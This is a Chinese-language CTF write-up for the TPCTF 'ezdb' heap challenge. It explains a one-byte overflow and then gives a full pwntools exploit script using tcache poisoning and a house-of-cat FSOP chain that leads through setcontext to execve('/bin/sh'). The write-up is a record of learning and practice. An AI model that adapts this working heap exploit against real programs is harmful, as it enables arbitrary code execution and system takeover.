---
title: TPCTF-ezdb
date: 2025-03-13 21:54:39
tags:
	-wp
	-pwn学习总结
categories:
  - wp
---









### 0x00 前言

  比赛的时候没有发现insert里改size的漏洞:disappointed_relieved:，究其原因，还是自己的逆向能力不足，比赛后看到复现了一下这道题目，同时也简单记录一下house of cat的用法。

### 0x01 解题思路

![image-20250314144711236](TPCTF-ezdb/image-20250314144711236.png)

 菜单堆，在insert功能的InsertRecord功能中的getfreespace函数中存在一个1字节的溢出，

可以改到存储在chunk头部的size，然后无限溢出tcache bin attack，把io_list_all改到可控的堆地址，

构造house of cat的链子，用secontext执行execve getshell.

```python
from tools import*
context(arch='amd64',log_level='debug')
p=process("./db")
e=ELF("./db")
# libc=ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

def create(idx):
    p.sendlineafter(">>>",b'1')
    p.sendlineafter("Index:",str(idx))
def remove(idx):
    p.sendlineafter(">>>",b'2')
    p.sendlineafter("Index:",str(idx))
def insert(idx,lenth,data):
    p.sendlineafter(">>>",b'3')
    p.sendlineafter("Index:",str(idx))
    p.sendlineafter("Length:",str(lenth))
    p.sendafter("Varchar:",data)
def get(idx,id):
    p.sendlineafter(">>>",b'4')
    p.sendlineafter("Index:",str(idx))
    p.sendlineafter("ID:",str(id))
def edit(idx,id,lenth,data):
    p.sendlineafter(">>>",b'5')
    p.sendlineafter("Index:",str(idx))
    p.sendlineafter("ID:",str(id))
    p.sendlineafter("Length:",str(lenth))
    p.sendafter("Varchar:",data)




create(0) #30
for i in range(9):
    create(i+1)

for i in range(8):
    remove(i+1)


insert(0,0x3fd,"\x66"*0x3fd)
# edit(0,0,0x500,"a"*0x3fd)
# edit(0,0,0x500,"a")
get(0,0)
p.recv(0x64)
heap_base = u64(p.recvuntil(b'\x55')[-6:].ljust(8,b'\x00'))-0x12720
p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-0x301ce0


create(1)
create(2)
create(3)
create(4)
create(5)
create(6) 
create(7)
create(8) 
  
# 2->7
#  3->6
 
remove(6)
remove(7)
# edit(0,)
 
who_io=1
 
IO_list_all=0x302680+libc_base-0x3f0
tcache_io=((heap_base+0x12320)>>12)^IO_list_all
tcache_top=((heap_base+0x122f0)>>12)^(heap_base+0x12730)
payload=b"x"*(0x3fd)+p64(0)+p64(0x31)+p64(tcache_top)+p64(0)*4+p64(0x411)+p64(tcache_io)

pop_rdi=0x00000000000488dc+libc_base

p.recvuntil("Exit") 

edit(0,0,len(payload),payload)

create(6)
create(7)
insert(7,0x30,p64(heap_base+0x11ef0)*6)#fake_io_addra

file_addr=heap_base+0x11ef0
fake_io_addr=heap_base+0x11ef0
system=libc_base+0x137d70

execve=libc_base+0x1d2080

read=libc_base+0x1fb7d0
setcontext=0x13a9e0+libc_base
leave_ret=0x0000000000018ed0+libc_base
chunk3=fake_io_addr # 伪造的fake_IO结构体的地址

_IO_wfile_jumps=libc_base+0x2fe0c0


next_chain = 0
fake_IO_FILE=p64(fake_io_addr-8)         #_flags=rdi
fake_IO_FILE+=p64(0)*7
fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx
fake_IO_FILE +=p64(setcontext+61)#_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x68, b'\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x88, b'\x00')
fake_IO_FILE += p64(heap_base+0x1000)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xa0, b'\x00')
fake_IO_FILE +=p64(fake_io_addr+0x30)   #_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xc0, b'\x00')
fake_IO_FILE += p64(1) #mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xd8, b'\x00')
fake_IO_FILE += p64(_IO_wfile_jumps+0x30)  # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr
fake_IO_FILE = fake_IO_FILE.ljust(0x150,b'\x00')+p64(fake_io_addr+0x160)+p64(pop_rdi)+p64(fake_io_addr-8)+p64(execve)

fake_io = b"a"*4+b"\x00/bin/sh\x00"+fake_IO_FILE

edit(0,0,0x1000,fake_io)

debug(p,0x1759bf+libc_base)

# debug(p,0x175b50+libc_base)

log_addr("heap_base") 
log_addr("libc_base")



p.sendlineafter(">>>",b'6')

p.interactive()

```

